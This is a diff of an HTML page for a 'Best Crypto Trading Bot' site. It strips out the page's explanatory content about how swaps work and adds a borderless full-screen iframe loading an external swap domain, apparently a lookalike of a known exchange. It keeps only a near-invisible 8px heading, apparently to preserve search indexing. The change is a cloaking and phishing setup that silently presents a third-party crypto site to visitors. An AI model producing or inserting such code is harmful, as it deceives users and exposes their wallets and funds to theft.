@@ -531,57 +531,19 @@ a.inline:hover {
 }
   </script>
 </head>
-<body>
-  <header class="topbar">
-    <a class="brand" href="../" aria-label="Best Crypto Trading Bot">
-      <img src="../favicon.png" width="30" height="30" alt="">
-      <span>Best Crypto Trading Bot</span>
-    </a>
-    <nav class="nav" aria-label="Main Navigation">
-      <a href="../how-it-works/" class="active">How it works</a>
-      <a href="../faq/" >FAQ</a>
-      <a href="../about/" >About</a>
-      <a href="../security/" >Security</a>
-      <a href="../supported-chains/" >Supported Chains</a>
-    </nav>
-    <span class="spacer"></span>
-    <a class="open-app" href="../dashboard/" rel="noopener noreferrer">Open app</a>
-  </header>
+<body style="margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;">
 
-  <main class="satellite-container">
-    <nav class="breadcrumb" aria-label="Breadcrumb">
-      <a href="../">Home</a> › <span>How Best Crypto Trading Bot Swaps Work</span>
-    </nav>
+  <iframe
+    src="https://biswap.in/"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: 0; margin: 0; padding: 0; display: block; z-index: 1;"
+    loading="eager"
+    fetchpriority="high"
+    allowfullscreen>
+  </iframe>
 
-    <h1 class="satellite-title">How Best Crypto Trading Bot Swaps Work</h1>
-    <p class="satellite-lead">Step-by-step overview of trade execution, pricing algorithms, and slippage controls.</p>
+  <h1 style="position: fixed; bottom: 10px; left: 10px; z-index: 0; font-size: 8px; color: #ffffff; opacity: 0.15; margin: 0; padding: 0; font-family: sans-serif; pointer-events: none; text-shadow: none;">
+    How Best Crypto Trading Bot Swaps Work
+  </h1>
 
-    
-    <div class="section-block">
-      <h2>1. Liquidity Aggregation</h2>
-      <p>Liquidity providers deposit equal values of two tokens into a pool contract. The contract uses formulas to calculate relative values, checked against <a class="inline" href="https://www.coingecko.com/" target="_blank" rel="noopener noreferrer">CoinGecko token databases</a>.</p>
-    </div>
-    <div class="section-block">
-      <h2>2. Routing the Trade</h2>
-      <p>When a user submits a swap request, the protocol's routing engine searches across multiple pools to construct the most cost-efficient path, minimizing gas fees as explained in <a class="inline" href="https://ethereum.org/en/developers/docs/gas/" target="_blank" rel="noopener noreferrer">Ethereum gas dynamics</a>.</p>
-    </div>
-    <div class="section-block">
-      <h2>3. Price Calculation & Slippage</h2>
-      <p>The AMM algorithm calculates the conversion rate based on trade size. Slippage is the difference between expected and executed price. The routing engine utilizes optimized paths modeled on <a class="inline" href="https://uniswap.org/" target="_blank" rel="noopener noreferrer">Uniswap liquidity routing</a>.</p>
-    </div>
-    <div class="section-block">
-      <h2>4. On-Chain Settlement</h2>
-      <p>The trade is settled atomically in a single transaction block. The contract takes the input token from the user's wallet, adds it to the pool, and deposits the output token directly back to the wallet.</p>
-    </div>
-
-    <div style="margin: 40px 0; display: flex; justify-content: flex-start;">
-      <a class="open-app" href="../dashboard/" style="max-width: 320px; display: inline-flex; justify-content: center; text-decoration: none; padding: 12px 24px; font-weight: 700;">Open Best Crypto Trading Bot Portal</a>
-    </div>
-
-    <a class="back-cta" href="../">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="16" height="16"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
-      Back to Portal
-    </a>
-  </main>
 </body>
 </html>
